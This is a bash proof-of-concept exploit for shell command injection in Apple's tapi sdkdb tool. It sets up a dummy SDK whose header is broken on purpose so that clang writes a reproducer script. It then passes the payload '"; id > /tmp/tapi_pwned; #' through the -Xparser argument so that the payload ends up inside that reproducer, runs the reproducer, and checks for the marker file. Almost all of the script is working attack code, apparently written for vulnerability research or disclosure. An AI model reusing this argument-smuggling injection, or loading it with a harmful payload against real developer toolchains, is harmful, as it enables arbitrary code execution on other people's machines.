#!/bin/bash
# shell command injection poc

echo "clean up"
rm -rf poc_sdk poc_output pwned /tmp/tapi_pwned /tmp/tapi_include_headers*
echo "SDK set up ..."
mkdir -p poc_sdk/usr/lib
mkdir -p poc_sdk/usr/include

# 1. test dylib
echo "int dummy() { return 0; }" > dummy.c
clang -dynamiclib dummy.c -o poc_sdk/usr/lib/libdummy.dylib
rm dummy.c

# 2. create header with syntax error -> triggers clang failure & reproducer generation.
echo "syntax error -> trigger reproducer" > poc_sdk/usr/include/dummy.h

# 3. payload: "; id > /tmp/tapi_pwned; #
PAYLOAD='"; id > /tmp/tapi_pwned; #'

echo "run payload in -Xparser..."
xcrun tapi sdkdb --runtime-root poc_sdk --sdk-content-root poc_sdk -o poc_output -Xparser "$PAYLOAD" --target=arm64-apple-macos 2> tapi_err.log

# 4. Locate generated reproducer script
REPRODUCER=$(grep "reproducer error written to:" tapi_err.log | cut -d'"' -f2 | sed 's/{m,sh}/sh/') # didn't know tapi often writes this to /tmp/ if output directory isn't fully ready or fallback to default template.

if [ -z "$REPRODUCER" ] || [ ! -f "$REPRODUCER" ]; then
    echo "Failed to find reproducer script. if /tmp/ has it..."
    REPRODUCER=$(ls /tmp/tapi_include_headers-*.sh 2>/dev/null | tail -n 1)
fi

if [ -z "$REPRODUCER" ]; then
    echo "Reproducer script not found. content:"
    cat tapi_err.log
    exit 1
fi

echo "Found reproducer: $REPRODUCER"
echo "Running reproducer..."
sh "$REPRODUCER" > /dev/null 2>&1

if [ -f /tmp/tapi_pwned ]; then
    echo "Success! output:"
    cat /tmp/tapi_pwned
    rm /tmp/tapi_pwned
else
    echo "failed. /tmp/tapi_pwned not found."
fi
